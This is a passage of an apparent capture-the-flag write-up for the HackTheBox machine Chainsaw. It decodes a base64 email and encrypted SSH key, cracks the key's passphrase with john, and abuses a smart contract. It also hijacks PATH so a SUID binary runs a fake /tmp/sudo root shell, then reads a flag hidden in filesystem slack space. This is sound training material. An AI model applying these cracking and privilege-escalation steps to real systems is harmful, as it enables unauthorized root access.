IGRpc2FibGVkIFNTSCBwYXNzd29yZCBhdXRoZW50aWNhdGlvbiBhbmQgaW5zdGVhZCB3ZSB3aWxs
IHVzZSBwcml2YXRlL3B1YmxpYyBrZXkgcGFpcnMgdG8gc2VjdXJlbHkgYW5kIGNvbnZlbmllbnRs
eSBhY2Nlc3MgdGhlIG1hY2hpbmUuPGJyPjwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+QXR0YWNo
ZWQgeW91IHdpbGwgZmluZCB5b3VyIHBlcnNvbmFsIGVuY3J5cHRlZCBwcml2YXRlIGtleS4gUGxl
YXNlIGFzayZuYnNwO3JlY2VwdGlvbiBkZXNrIGZvciB5b3VyIHBhc3N3b3JkLCB0aGVyZWZvcmUg
YmUgc3VyZSB0byBicmluZyB5b3VyIHZhbGlkIElEIGFzIGFsd2F5cy48YnI+PC9kaXY+PGRpdj48
YnI+PC9kaXY+PGRpdj5TaW5jZXJlbHksPGJyPjwvZGl2PjxkaXY+SVQgQWRtaW5pc3RyYXRpb24g
RGVwYXJ0bWVudDxicj48L2Rpdj4=
-----------------------ffced83f318ffbd54e80374f045d2451--
-----------------------d296272d7cb599bff2a1ddf6d6374d93
Content-Type: application/octet-stream; filename="bobby.key.enc"; name="bobby.key.enc"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="bobby.key.enc"; name="bobby.key.enc"

LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
Sy1JbmZvOiBERVMtRURFMy1DQkMsNTNEODgxRjI5OUJBODUwMwoKU2VDTll3L0JzWFB5UXExSFJM
RUVLaGlOSVZmdFphZ3pPY2M2NGZmMUlwSm85SWVHN1ovemordjFkQ0lkZWp1awo3a3RRRmN6VGx0
dG5ySWo2bWRCYjZybk42Q3NQMHZiejlOelJCeWcxbzZjU0dkckwyRW1KTi9lU3hENEFXTGN6Cm4z
MkZQWTBWamxJVnJoNHJqaFJlMndQTm9nQWNpQ0htWkdFQjB0Z3YyL2V5eEU2M1ZjUnpyeEpDWWwr
aHZTWjYKZnZzU1g4QTRRcjdyYmY5Zm56NFBJbUlndXJGM1ZoUW1kbEVtekRSVDRtL3BxZjNUbUdB
azkrd3JpcW5rT0RGUQpJKzJJMWNQYjhKUmhMU3ozcHlCM1gvdUdPVG5ZcDRhRXErQVFaMnZFSnoz
RmZYOVNYOWs3ZGQ2S2FadFNBenFpCnc5ODFFUzg1RGs5TlVvOHVMeG5aQXczc0Y3UHo0RXVKMEhw
bzFlWmdZdEt6dkRLcnJ3OHVvNFJDYWR4N0tIUlQKaW5LWGR1SHpuR0ExUVJPelpXN3hFM0hFTDN2
eFI5Z01WOGdKUkhEWkRNSTl4bHc5OVFWd2N4UGNGYTMxQXpWMgp5cDNxN3lsOTU0U0NNT3RpNFJD
M1o0eVVUakRrSGRIUW9FY0dpZUZPV1UraTFvaWo0Y3J4MUxiTzJMdDhuSEs2CkcxQ2NxN2lPb240
UnNUUmxWcnY4bGlJR3J4bmhPWTI5NWU5ZHJsN0JYUHBKcmJ3c284eHhIbFQzMzMzWVU5ZGoKaFFM
TnA1KzJINCtpNm1tVTN0Mm9nVG9QNHNrVmNvcURsQ0MrajZoRE9sNGJwRDl0NlRJSnVyV3htcEdn
TnhlcwpxOE5zQWVudGJzRCt4bDRXNnE1bXVMSlFtai94UXJySGFjRVpER0k4a1d2WkUxaUZtVmtE
L3hCUm53b0daNWh0CkR5aWxMUHBsOVIrRGg3YnkzbFBtOGtmOHRRbkhzcXBSSGNleUJGRnBucTBB
VWRFS2ttMUxSTUxBUFlJTGJsS0cKandyQ3FSdkJLUk1JbDZ0SmlEODdOTTZKQm9ReWRPRWNwbis2
RFUrMkFjdGVqYnVyMGFNNzRJeWVlbnJHS1NTWgpJWk1zZDJrVFNHVXh5OW8veFBLRGtVdy9TRlV5
U21td2lxaUZMNlBhRGd4V1F3SHh0eHZtSE1oTDZjaXROZEl3ClRjT1RTSmN6bVIycEp4a29oTHJI
N1lyUzJhbEtzTTBGcEZ3bWR6MS9YRFNGMkQ3aWJmL1cxbUF4TDVVbUVxTzAKaFVJdVcxZFJGd0hq
TnZhb1NrK2ZyQXA2aWM2SVBZU21kbzhHWVl5OHBYdmNxd2ZScHhZbEFDWnU0RmlpNmhZaQo0V3Bo
VDNaRllEcnc3U3RnSzA0a2JEN1FrUGVOcTlFdjFJbjJuVmR6RkhQSWg2eitmbXBiZ2ZXZ2VsTEhj
MmV0ClNKWTQrNUNFYmtBY1lFVW5QV1k5U1BPSjdxZVU3K2IvZXF6aEtia3BuYmxtaUsxZjNyZU9N
MllVS3k4YWFsZWgKbkpZbWttcjN0M3FHUnpoQUVUY2tjOEhMRTExZEdFK2w0YmE2V0JOdTE1R29F
V0Fzenp0TXVJVjFlbW50OTdvTQpJbW5mb250T1lkd0I2LzJvQ3V5SlRpZjhWdy9XdFdxWk5icGV5
OTcwNGE5bWFwLytiRHFlUVE0MStCOEFDRGJLCldvdnNneVdpL1VwaU1UNm02clgrRlA1RDVFOHpy
WXRubm1xSW83dnhIcXRCV1V4amFoQ2RuQnJrWUZ6bDZLV1IKZ0Z6eDNlVGF0bFpXeXI0a3N2Rm10
b2JZa1pWQVFQQUJXeitnSHB1S2xycWhDOUFOenIvSm4rNVpmRzAybW9GLwplZEwxYnA5SFBSSTQ3
RHl2THd6VDEvNUw5Wno2WSsxTXplbmRUaTNLcnpRL1ljZnI1WUFSdll5TUxiTGpNRXRQClV2SmlZ
NDB1Mm5tVmI2UXFwaXkyenIvYU1saHB1cFpQay94dDhvS2hLQytsOW1nT1RzQVhZakNiVG1MWHpW
clgKMTVVMjEwQmR4RUZVRGNpeE5pd1Rwb0JTNk1meENPWndOLzFadjBtRThFQ0krNDRMY3FWdDN3
PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0=
-----------------------d296272d7cb599bff2a1ddf6d6374d93--

```

There’s two sections there that are base64 encoded. The first is the email message:

```

root@kali# vim message.b64
root@kali# base64 -d message.b64 
<div>Bobby,<br></div><div><br></div><div>I am writing this email in reference to the method on how we access our Linux server from now on. Due to security reasons, we have disabled SSH password authentication and instead we will use private/public key pairs to securely and conveniently access the machine.<br></div><div><br></div><div>Attached you will find your personal encrypted private key. Please ask&nbsp;reception desk for your password, therefore be sure to bring your valid ID as always.<br></div><div><br></div><div>Sincerely,<br></div><div>IT Administration Department<br></div>

```

The second is an SSH key:

```

root@kali# vim bobby.key.enc.b64
root@kali# base64 -d bobby.key.enc.b64 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,53D881F299BA8503

SeCNYw/BsXPyQq1HRLEEKhiNIVftZagzOcc64ff1IpJo9IeG7Z/zj+v1dCIdejuk
7ktQFczTlttnrIj6mdBb6rnN6CsP0vbz9NzRByg1o6cSGdrL2EmJN/eSxD4AWLcz
n32FPY0VjlIVrh4rjhRe2wPNogAciCHmZGEB0tgv2/eyxE63VcRzrxJCYl+hvSZ6
fvsSX8A4Qr7rbf9fnz4PImIgurF3VhQmdlEmzDRT4m/pqf3TmGAk9+wriqnkODFQ
I+2I1cPb8JRhLSz3pyB3X/uGOTnYp4aEq+AQZ2vEJz3FfX9SX9k7dd6KaZtSAzqi
w981ES85Dk9NUo8uLxnZAw3sF7Pz4EuJ0Hpo1eZgYtKzvDKrrw8uo4RCadx7KHRT
inKXduHznGA1QROzZW7xE3HEL3vxR9gMV8gJRHDZDMI9xlw99QVwcxPcFa31AzV2
yp3q7yl954SCMOti4RC3Z4yUTjDkHdHQoEcGieFOWU+i1oij4crx1LbO2Lt8nHK6
G1Ccq7iOon4RsTRlVrv8liIGrxnhOY295e9drl7BXPpJrbwso8xxHlT3333YU9dj
hQLNp5+2H4+i6mmU3t2ogToP4skVcoqDlCC+j6hDOl4bpD9t6TIJurWxmpGgNxes
q8NsAentbsD+xl4W6q5muLJQmj/xQrrHacEZDGI8kWvZE1iFmVkD/xBRnwoGZ5ht
DyilLPpl9R+Dh7by3lPm8kf8tQnHsqpRHceyBFFpnq0AUdEKkm1LRMLAPYILblKG
jwrCqRvBKRMIl6tJiD87NM6JBoQydOEcpn+6DU+2Actejbur0aM74IyeenrGKSSZ
IZMsd2kTSGUxy9o/xPKDkUw/SFUySmmwiqiFL6PaDgxWQwHxtxvmHMhL6citNdIw
TcOTSJczmR2pJxkohLrH7YrS2alKsM0FpFwmdz1/XDSF2D7ibf/W1mAxL5UmEqO0
hUIuW1dRFwHjNvaoSk+frAp6ic6IPYSmdo8GYYy8pXvcqwfRpxYlACZu4Fii6hYi
4WphT3ZFYDrw7StgK04kbD7QkPeNq9Ev1In2nVdzFHPIh6z+fmpbgfWgelLHc2et
SJY4+5CEbkAcYEUnPWY9SPOJ7qeU7+b/eqzhKbkpnblmiK1f3reOM2YUKy8aaleh
nJYmkmr3t3qGRzhAETckc8HLE11dGE+l4ba6WBNu15GoEWAszztMuIV1emnt97oM
ImnfontOYdwB6/2oCuyJTif8Vw/WtWqZNbpey9704a9map/+bDqeQQ41+B8ACDbK
WovsgyWi/UpiMT6m6rX+FP5D5E8zrYtnnmqIo7vxHqtBWUxjahCdnBrkYFzl6KWR
gFzx3eTatlZWyr4ksvFmtobYkZVAQPABWz+gHpuKlrqhC9ANzr/Jn+5ZfG02moF/
edL1bp9HPRI47DyvLwzT1/5L9Zz6Y+1MzendTi3KrzQ/Ycfr5YARvYyMLbLjMEtP
UvJiY40u2nmVb6Qqpiy2zr/aMlhpupZPk/xt8oKhKC+l9mgOTsAXYjCbTmLXzVrX
15U210BdxEFUDcixNiwTpoBS6MfxCOZwN/1Zv0mE8ECI+44LcqVt3w==
-----END RSA PRIVATE KEY-----

```

### Crack Password

I’ll crack the password on the key with `john` / `rockyou`:

```

root@kali# base64 -d bobby.key.enc.b64 > bobby.key.enc
root@kali# /opt/john/run/ssh2john.py bobby.key.enc > bobby.key.enc.john
root@kali# /opt/john/run/john bobby.key.enc.john --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 3 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
jackychain       (bobby.key.enc)
1g 0:00:00:14 DONE (2019-07-06 17:31) 0.06770g/s 971001p/s 971001c/s 971001C/s     1990..*7¡Vamos!
Session completed

```

I’ll make a copy of the key with no password:

```

root@kali# openssl rsa -in bobby.key.enc -out ~/id_rsa_chainsaw_bobby
Enter pass phrase for bobby.key.enc:
writing RSA key

```

### SSH Shell

Now I can connect as bobby:

```

root@kali# ssh -i ~/id_rsa_chainsaw_bobby bobby@10.10.10.142
bobby@chainsaw:~$ id
uid=1000(bobby) gid=1000(bobby) groups=1000(bobby),30(dip)

```

And grab `user.txt`:

```

bobby@chainsaw:~$ cat user.txt
af8d9df9************************

```

## Priv: bobby –> root

### Enumeration

In addition to `user.txt`, there’s two folders in bobby’s homedir:

```

bobby@chainsaw:~$ ls
projects  resources  user.txt

```

`resources` has documentation related to IPFS:

```

bobby@chainsaw:~$ find resources/ -type f
resources/InterPlanetary_File_System.pdf
resources/IPFS-Draft.pdf
resources/IPFS-Presentation.pdf

```

`projects` has `.json` and `.sol` files, as well as a SUID binary:

```

bobby@chainsaw:~$ find projects/ -type f -ls
   787875     20 -rwsr-xr-x   1 root     root        16544 Jan 12  2019 projects/ChainsawClub/ChainsawClub
   787871    124 -rw-r--r--   1 root     root       126388 Jan 23  2019 projects/ChainsawClub/ChainsawClub.json
   787872      4 -rw-r--r--   1 root     root         1164 Jan 23  2019 projects/ChainsawClub/ChainsawClub.sol

```

When I run it, it says that I must sign up, and then I can log in:

```

bobby@chainsaw:~/projects/ChainsawClub$ ./ChainsawClub 

      _           _
     | |         (_)
  ___| |__   __ _ _ _ __  ___  __ ___      __
 / __| '_ \ / _` | | '_ \/ __|/ _` \ \ /\ / /
| (__| | | | (_| | | | | \__ \ (_| |\ V  V /
 \___|_| |_|\__,_|_|_| |_|___/\__,_| \_/\_/
                                            club
- Total supply: 1000
- 1 CHC = 51.08 EUR
- Market cap: 51080 (€)

[*] Please sign up first and then log in!
[*] Entry based on merit.

Username:

```

There’s also now an additional file in the folder:

```

bobby@chainsaw:~/projects/ChainsawClub$ ls
address.txt  ChainsawClub  ChainsawClub.json  ChainsawClub.sol

```

### Path 1: Interact with Contract

The intended path here was the exploit this second smart contract. In fact, I can see it listening on TCP 63991:

```

bobby@chainsaw:~/projects/ChainsawClub$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9810            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:63991         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   

```

If I try to connect, I see the same thing I saw on port 9810 during original enumeration:

```

bobby@chainsaw:~/projects/ChainsawClub$ curl -s 127.0.0.1:63991
400 Bad Request

```

I’m in the same position I was originally in, with the information I need to connect over `web3`. I’ll use [SSH Control Sequences](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences) to forward 63991 on my local box through SSH to 63991 on Chainsaw:

```

bobby@chainsaw:~/projects/ChainsawClub$
ssh> -L 63991:127.0.0.1:63991
Forwarding port. 

```

I’ll also copy all the files back to my host:

```

root@kali# scp -i ~/id_rsa_chainsaw_bobby bobby@10.10.10.142:/home/bobby/projects/ChainsawClub/* .
address.txt                                                                          100%   44     2.4KB/s   00:00
ChainsawClub                                                                         100%   16KB 474.7KB/s   00:00                                                                        
ChainsawClub.json                                                                    100%  123KB   2.8MB/s   00:00
ChainsawClub.sol                                                                     100% 1164    83.3KB/s   00:00 

```

Now I can connect with a Python terminal again, and load the json and address:

```

>>> infura_url = "http://127.0.0.1:63991"
>>> web3 = Web3(Web3.HTTPProvider(infura_url))      
>>> print(web3.isConnected())
True
>>> with open('ChainsawClub.json') as f:
...     wp = json.load(f)
...
>>> wp['abi']
[{'constant': True, 'inputs': [], 'name': 'getUsername', 'outputs': [{'name': '', 'type': 'string'}], 'payable': False, 'stateMutability': 'view', 'type': 'function'}, {'constant': False, 'inputs': [{'name': '_value', 'type': 'string'}], 'name': 'setUsername', 'outputs': [], 'payable': False, 'stateMutability': 'nonpayable', 'type': 'function'}, {'constant': True, 'inputs': [], 'name': 'getPassword', 'outputs': [{'name': '', 'type': 'string'}], 'payable': False, 'stateMutability': 'view', 'type': 'function'}, {'constant': False, 'inputs': [{'name': '_value', 'type': 'string'}], 'name': 'setPassword', 'outputs': [], 'payable': False, 'stateMutability': 'nonpayable', 'type': 'function'}, {'constant': True, 'inputs': [], 'name': 'getApprove', 'outputs': [{'name': '', 'type': 'bool'}], 'payable': False, 'stateMutability': 'view', 'type': 'function'}, {'constant': False, 'inputs': [{'name': '_value', 'type': 'bool'}], 'name': 'setApprove', 'outputs': [], 'payable': False, 'stateMutability': 'nonpayable', 'type': 'function'}, {'constant': True, 'inputs': [], 'name': 'getSupply', 'outputs': [{'name': '', 'type': 'uint256'}], 'payable': False, 'stateMutability': 'view', 'type': 'function'}, {'constant': True, 'inputs': [], 'name': 'getBalance', 'outputs': [{'name': '', 'type': 'uint256'}], 'payable': False, 'stateMutability': 'view', 'type': 'function'}, {'constant': False, 'inputs': [{'name': '_value', 'type': 'uint256'}], 'name': 'transfer', 'outputs': [], 'payable': False, 'stateMutability': 'nonpayable', 'type': 'function'}, {'constant': False, 'inputs': [], 'name': 'reset', 'outputs': [], 'payable': False, 'stateMutability': 'nonpayable', 'type': 'function'}]
>>> with open('address.txt','r') as f:
...     address = f.read().strip()
... 
>>> address
'0xea44d62eA6e98b7B8301B8c14556C04d186EECA2'

```

Now I’ll create the contract, set the default user, and see what functions I have available (both by hitting `tab` after `contract.function.` or with `dir`):

```

>>> contract = web3.eth.contract(address=address, abi=wp['abi'])
>>> web3.eth.defaultAccount = web3.eth.accounts[0]
>>> contract.functions.
contract.functions.abi           contract.functions.getBalance(   contract.functions.getSupply(    contract.functions.reset(        contract.functions.setPassword(  contract.functions.transfer(
contract.functions.getApprove(   contract.functions.getPassword(  contract.functions.getUsername(  contract.functions.setApprove(   contract.functions.setUsername(  
>>> dir(contract.functions)
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattr__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_functions', 'abi', 'getApprove', 'getBalance', 'getPassword', 'getSupply', 'getUsername', 'reset', 'setApprove', 'setPassword', 'setUsername', 'transfer']

```

I was able to create a user and a password:

```

>>> contract.functions.setUsername('0xdf').transact()
HexBytes('0xcce7101f6b446a50f6476ff51b452b3f114733a0bd2878f0b0fd1ace69508ee5')
>>> contract.functions.setPassword('0xdf').transact()
HexBytes('0x2d6798fbcef36149b94e8320ab41c374b4a7fd98902a52030bb366345988b331')

```

I then tried to login, but it didn’t work:

```

bobby@chainsaw:~/projects/ChainsawClub$ ./ChainsawClub 

      _           _
     | |         (_)
  ___| |__   __ _ _ _ __  ___  __ ___      __
 / __| '_ \ / _` | | '_ \/ __|/ _` \ \ /\ / /
| (__| | | | (_| | | | | \__ \ (_| |\ V  V /
 \___|_| |_|\__,_|_|_| |_|___/\__,_| \_/\_/
                                            club
- Total supply: 1000
- 1 CHC = 51.08 EUR
- Market cap: 51080 (€)

[*] Please sign up first and then log in!
[*] Entry based on merit.

Username: 0xdf
Password: 
[*] Wrong credentials!

```

Looking more closely at the `ChainsawClub.sol` file, I see default values for the variables at the top:

```

pragma solidity ^0.4.22;

contract ChainsawClub {

  string username = 'nobody';
  string password = '7b455ca1ffcb9f3828cfdde4a396139e';
  bool approve = false;
  uint totalSupply = 1000;
  uint userBalance = 0;

  function getUsername() public view returns (string) {
      return username;
  }
  function setUsername(string _value) public {
      username = _value;
  }
  function getPassword() public view returns (string) {
      return password;
  }
  function setPassword(string _value) public {
      password = _value;
  }
  function getApprove() public view returns (bool) {
      return approve;
  }
  function setApprove(bool _value) public {
      approve = _value;
  }
  function getSupply() public view returns (uint) {
      return totalSupply;
  }
  function getBalance() public view returns (uint) {
      return userBalance;
  }
  function transfer(uint _value) public {
      if (_value > 0 && _value <= totalSupply) {
          totalSupply -= _value;
          userBalance += _value;
      }
  }
  function reset() public {
      username = '';
      password = '';
      userBalance = 0;
      totalSupply = 1000;
      approve = false;
  }
}

```

The password field looks like an MD5 hash. I’ll try hashing my password:

```

root@kali# echo -n 0xdf | md5sum
465e929fc1e0853025faad58fc8cb47d  -

```

And submitting that:

```

>>> contract.functions.setPassword('465e929fc1e0853025faad58fc8cb47d').transact()
HexBytes('0x3a00d64de726e98832c988246ffa9725e8048ea855d2ace33be372808a784caf')

```

Now when I try to log in, I get a different error:

```

bobby@chainsaw:~/projects/ChainsawClub$ ./ChainsawClub 

      _           _
     | |         (_)
  ___| |__   __ _ _ _ __  ___  __ ___      __
 / __| '_ \ / _` | | '_ \/ __|/ _` \ \ /\ / /
| (__| | | | (_| | | | | \__ \ (_| |\ V  V /
 \___|_| |_|\__,_|_|_| |_|___/\__,_| \_/\_/
                                            club
- Total supply: 1000
- 1 CHC = 51.08 EUR
- Market cap: 51080 (€)

[*] Please sign up first and then log in!
[*] Entry based on merit.

Username: 0xdf
Password: 
[*] User is not approved!

```

There are `getApprove` and `setApprove` functions in the `.sol` file. I’ll try `getApprove` (using `.call()` since it’s a get function):

```

>>> contract.functions.getApprove().call()
False

```

Now `setApprove`:

```

>>> contract.functions.setApprove(True).transact()
HexBytes('0x6072819f412e876bb445131cd60223619b084e28672d0a75dcadf419f94e1dad')

```

And I’m approved:

```

>>> contract.functions.getApprove().call()
True

```

Now I can log in, but a new error:

```

bobby@chainsaw:~/projects/ChainsawClub$ ./ChainsawClub 

      _           _
     | |         (_)
  ___| |__   __ _ _ _ __  ___  __ ___      __
 / __| '_ \ / _` | | '_ \/ __|/ _` \ \ /\ / /
| (__| | | | (_| | | | | \__ \ (_| |\ V  V /
 \___|_| |_|\__,_|_|_| |_|___/\__,_| \_/\_/
                                            club
- Total supply: 1000
- 1 CHC = 51.08 EUR
- Market cap: 51080 (€)

[*] Please sign up first and then log in!
[*] Entry based on merit.

Username: 0xdf
Password: 
[*] Not enough funds!

```

Since I see that the total supply is 1000, I’ll transfer all of it:

```

>>> contract.functions.transfer(1000).transact()
HexBytes('0x24f7591dc75e60a1f82381497457a0e91946aee7d440f5f7339ba3da39b4fd5e')

```

Now when I log in, I get a root shell:

```

bobby@chainsaw:~/projects/ChainsawClub$ ./ChainsawClub 

      _           _
     | |         (_)
  ___| |__   __ _ _ _ __  ___  __ ___      __
 / __| '_ \ / _` | | '_ \/ __|/ _` \ \ /\ / /
| (__| | | | (_| | | | | \__ \ (_| |\ V  V /
 \___|_| |_|\__,_|_|_| |_|___/\__,_| \_/\_/
                                            club
- Total supply: 1000
- 1 CHC = 51.08 EUR
- Market cap: 51080 (€)

[*] Please sign up first and then log in!
[*] Entry based on merit.

Username: 0xdf
Password: 
         ************************
         * Welcome to the club! *
         ************************

 Rule #1: Do not get excited too fast.
    
root@chainsaw:/home/bobby/projects/ChainsawClub# id
uid=0(root) gid=0(root) groups=0(root)

```

### Path 2: Exploit Path

The shortcut here is to exploit the fact that the binary makes a call to `sudo` without specifying the path. I can see this if I run `ltrace`:

```

bobby@chainsaw:~/projects/ChainsawClub$ ltrace ./ChainsawClub 
setuid(0)= -1
system("sudo -i -u root /root/ChainsawCl"...[sudo] password for bobby: 

```

`system` is passed `sudo` without a path, so it will use the current path, which I can modify. I’ll open this binary up in [Beyond Root](#beyond-root) and see what it’s doing.

I’ll add `/tmp` to the front of the path:

```

bobby@chainsaw:~/projects/ChainsawClub$ export PATH=/tmp:$PATH

```

Now, I’ll drop a script to run `bash` into `/tmp/sudo`, and get root:

```

bobby@chainsaw:~/projects/ChainsawClub$ echo -e '#!/bin/bash\n\n/bin/bash' > /tmp/sudo
bobby@chainsaw:~/projects/ChainsawClub$ chmod +x /tmp/sudo
bobby@chainsaw:~/projects/ChainsawClub$ ./ChainsawClub 
root@chainsaw:~/projects/ChainsawClub# id
uid=0(root) gid=1000(bobby) groups=1000(bobby),30(dip)

```

## Find Flag

### No Flag Yet

The intended path did give a warning: “Rule #1: Do not get excited too fast.” With a shell as root, `root.txt` is not the flag:

```

root@chainsaw:/root# cat root.txt
Mine deeper to get rewarded with root coin (RTC)...

```

### Slack Space

#### Enumeration

I eventually had to ask for a hint from a friend here, who told me that notice that `bmap` was on the box. Ippsec just tipped me to how he found it, which is cool, so I’ll share here.

Basically, files in `/sbin` are programs managed by the Apt Package manager. If a file is in there and not keep updated by the package manager, that’s odd, and worth investigating.

I can search what’s managed by `apt` using `dpkg --search`. For example, I’ll take the first program in `/sbin` on Chainsaw, `acpi_available`:

```

root@chainsaw:~/projects/ChainsawClub# ls /sbin/ | head -1
acpi_available

```

If I run `dpkg`, I can see the files associated with it:

```

root@chainsaw:~/projects/ChainsawClub# dpkg --search acpi_available
powermgmt-base: /sbin/acpi_available
powermgmt-base: /usr/share/man/man1/acpi_available.1.gz

```

If I run that same command on a non-`apt` binary, like `ChainsawClub`, there’s an error:

```

root@chainsaw:~/projects/ChainsawClub# dpkg --search ChainsawClub
dpkg-query: no path found matching pattern *ChainsawClub*

```

And I’ll note the good output goes to stdout, and the error goes to stderr.

So I’ll loop over all the files in `/sbin`, and look for any that throw an error, using `1>/dev/null` to ignore all the output when a file is found:

```

root@chainsaw:~/projects/ChainsawClub# for file in $(ls /sbin/*); do dpkg --search $file 1>/dev/null; done
dpkg-query: no path found matching pattern /sbin/bmap

```

The suspect binary is `bmap`. `bmap` is a [tool for reading/writing to file slack space](https://hackerkitty.wordpress.com/tag/bmap/). The fact that this is on the box is worth exploring.

I’ll show both how to read the slack space with `bmap`, and how to manually do it.

#### bmap

And it turns out that `root.txt` has information in its slack space:

```

root@chainsaw:/root# touch /tmp/0xdf
root@chainsaw:/root# bmap --mode checkslack /tmp/0xdf
/tmp/0xdf does not have slack
root@chainsaw:/root# bmap --mode checkslack root.txt 
root.txt has slack

```

I can dump it and get the flag:

```

root@chainsaw:/root# bmap --mode slack root.txt      
getting from block 2655304
file size was: 52
slack size: 4044
block size: 4096
68c874b7************************

```

#### Manual

Alternatively, I could read the slack space around `root.txt` by finding the block, and reading that information off the raw device. I’ll first check which device contains the filesystem with `df`:

```

root@chainsaw:/root# df
Filesystem     1K-blocks    Used Available Use% Mounted on
udev              989188       0    989188   0% /dev
tmpfs             204148    1104    203044   1% /run
/dev/sda2       15413192 5835908   8774624  40% /
tmpfs            1020728       4   1020724   1% /dev/shm
tmpfs               5120       0      5120   0% /run/lock
tmpfs            1020728       0   1020728   0% /sys/fs/cgroup
/dev/loop0         90624   90624         0 100% /snap/core/6964
/dev/loop1         91648   91648         0 100% /snap/core/6034
/dev/loop2         91648   91648         0 100% /snap/core/6130
/dev/loop3         53376   53376         0 100% /snap/lxd/9919
/dev/loop4         53248   53248         0 100% /snap/lxd/9886
/dev/loop5         11520   11520         0 100% /snap/ipfs/870
/dev/loop6         11776   11776         0 100% /snap/ipfs/1167
/dev/loop7         55552   55552         0 100% /snap/lxd/10756
tmpfs             204144       0    204144   0% /run/user/1000

```

`/dev/sda2` is the disk I want. Now I’ll use `debugfs` to get the block for `root.txt`:

```

root@chainsaw:/root# debugfs -R "blocks /root/root.txt" /dev/sda2
debugfs 1.44.4 (18-Aug-2018)
2655304 

```

Now I can read that however I want. I’ll use `python`:

```

root@chainsaw:/root# python
Python 2.7.15+ (default, Oct  2 2018, 22:12:08) 
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.              
>>> f = open("/dev/sda2", "rb")
>>> f.seek(2655304*4*1024)     
>>> f.read(128)                
'Mine deeper to get rewarded with root coin (RTC)...\n68c874b7************************\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
>>> f.close()

```

I open the device, and then seek into it the number of blocks times the block size. I can read the file and slack from there.

## Beyond Root

### ChainsawClub Binary

I saw with `ltrace` that the `ChainsawClub` ELF was making a call to `system` to run another binary in the root home directory as root using `sudo`. bobby isn’t in able to run this `sudo`, but since `ChainsawClub` is SUID and owned by root, it can run `sudo` as root.

When I open this up in IDA, I can see how simple `main` is:

![image-20191122044336508](https://0xdfimages.gitlab.io/img/image-20191122044336508.png)

I can basically guess at the C source:

```

#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(0);
    system("sudo -i -u root /root/ChainsawClub/dist/ChainsawClub/ChainsawClub");
    return 0;
}

```

In fact, if I open Ghidra, it gives me basically that same thing:

![image-20191122044811762](https://0xdfimages.gitlab.io/img/image-20191122044811762.png)

I suspect the box author wanted us to be able to run this binary as root without being able to get a copy to reverse.

### root’s ChainsawClub

#### PyInstaller

In `/root`, there’s a `ChainsawClub` dir:

```

root@chainsaw:~# ls
ChainsawClub  root.txt  snap

```

This directory has a Python script, as well as a `.spec` and a few directories:

```

root@chainsaw:~/ChainsawClub# ls
build  ChainsawClub.py  ChainsawClub.spec  dist  __pycache__

```

This directory structure indicates [PyInstaller](https://pyinstaller.readthedocs.io/en/stable/usage.html), a tool used to create executable binaries from Python code. It’s much more commonly used with Windows binaries, as Python is less common there. But it can be used to create ELFs as well.

#### Python

I’ll walk through this Python script, since I have the background to understand it at this point. The overall structure looks like:

```

#!/usr/bin/python3
# -*- coding: utf-8 -*-
from web3 import Web3
from sys import exit
import os, time, json
import getpass, hashlib

CPURP = '\033[95m'
CGREEN = '\033[92m'
CRED = '\033[91m'
CEND = '\033[0m'

def load_contract():
    #...[snip]...
    
def outer_banner():
    #..[snip]...
    
def inner_banner():
    #..[snip]...
    
if __name__ == "__main__":
    outer_banner()
    load_contract()

```

`out_banner()` just prints the banner on starting. So next it calls `load_contract()`, which matches what I saw when trying to login. First, it does the same `web3` stuff to connect, though there’s an interesting bit where it tries to read out of `address.txt`, and on failure, it gets the address over Web3:

```

def load_contract():
    while True:
        with open('/home/bobby/projects/ChainsawClub/ChainsawClub.json') as f:
            contractData = json.load(f)

        try:
            w3 = Web3(Web3.HTTPProvider('http://127.0.0.1:63991'))
            w3.eth.defaultAccount = w3.eth.accounts[0]
        except:
            print("Failed to establish a connection with Ganache! Exiting...")
            exit()

        Url = w3.eth.contract(abi=contractData['abi'],
                              bytecode=contractData['bytecode'])

        try:
            caddress = open("/home/bobby/projects/ChainsawClub/address.txt",'r').read()
            caddress = caddress.replace('\n', '')
        except:
            with open('/home/bobby/projects/ChainsawClub/address.txt', 'w') as f:
                tx_hash = \
                    Url.constructor().transact({'from': w3.eth.accounts[0]})
